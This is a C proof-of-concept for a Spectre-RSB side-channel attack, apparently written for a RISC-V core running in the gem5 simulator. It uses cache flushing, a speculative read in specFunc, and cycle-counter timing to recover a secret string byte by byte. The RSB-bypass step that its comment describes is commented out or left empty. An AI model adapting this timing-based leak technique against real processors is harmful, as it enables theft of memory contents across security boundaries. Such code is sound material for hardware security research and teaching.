#include <stdio.h>
#include <stdint.h>
#include "cache.h"

/**
 * 宏定义读寄存器操作
 * 读取特殊状态寄存器中记录的时间戳
 */
#define read_csr(reg) ({ unsigned long __tmp; \
  asm volatile ("csrr %0, " #reg : "=r"(__tmp)); \
  __tmp; })
#define rdcycle() read_csr(cycle) 

#define ATTACK_SAME_ROUNDS  10 
#define SECRET_SZ           26
#define CACHE_HIT_THRESHOLD 30

uint8_t attackArray[256 * L1_BLOCK_SZ_BYTES];
char*   secretString = "Zhou zhe shi da shuai ge!!";

void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray) {
    outValArray[0] = 0; outValArray[1] = 0;
    for (uint64_t i = 0; i < inArraySize; ++i) {
        if (inArray[i] > outValArray[0]) {
            outValArray[1] = outValArray[0]; outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0]; outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]) {
            outValArray[1] = inArray[i]; outIdxArray[1] = i;
        }
    }
}

void frameDump() {
    // gem5 don't need to delay the window
}

/**
 * function to read in the attack array given an attack address to read in. it does this speculatively by bypassing the RSB
 *
 * @input addr passed in address to read from
 */
void specFunc(char *addr) {
    uint64_t dummy = 0;
    // frameDump();
    char secret = *addr;
    dummy = attackArray[secret * L1_BLOCK_SZ_BYTES];
    dummy = rdcycle();
}

int main(void) {
    uint64_t start, diff;
    uint8_t dummy = 0;
    static uint64_t results[256];

    printf("This is a POC of Spectre-RSB (Return Stack Buffer)\n");
    printf("the secret key is:%s \n", secretString);

    for(uint64_t offset = 0; offset < SECRET_SZ; ++offset) {
        for(uint64_t i = 0; i < 256; ++i) results[i] = 0;
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound) {
            flushCache((uint64_t)attackArray, sizeof(attackArray));
            // run the particular attack sequence
            specFunc(secretString + offset);
            // __asm__ volatile ("ld fp, -16(sp)"); // Adjust the frame pointer for properly looping over the offset

            for(uint64_t i = 0; i < 256; ++i) {
                start = rdcycle();
                dummy &= attackArray[i * L1_BLOCK_SZ_BYTES];
                diff = (rdcycle() - start);
                if(diff < CACHE_HIT_THRESHOLD) results[i] += 1;
            }
        }
        uint8_t output[2] = {0, 0};
        uint64_t hitArray[2] = {0, 0};
        topTwoIdx(results, 256, output, hitArray);
        if(output[0] == (int)secretString[offset] || output[1] == (int)secretString[offset]) 
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
        (uint8_t*)(secretString + offset), secretString[offset], hitArray[0], output[0], output[0], 
                                                                 hitArray[1], output[1], output[1]); 
        else 
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
        (uint8_t*)(secretString + offset), secretString[offset], hitArray[0], output[0], output[0], 
                                                                 hitArray[1], output[1], output[1]);  
    }
    return 0;
}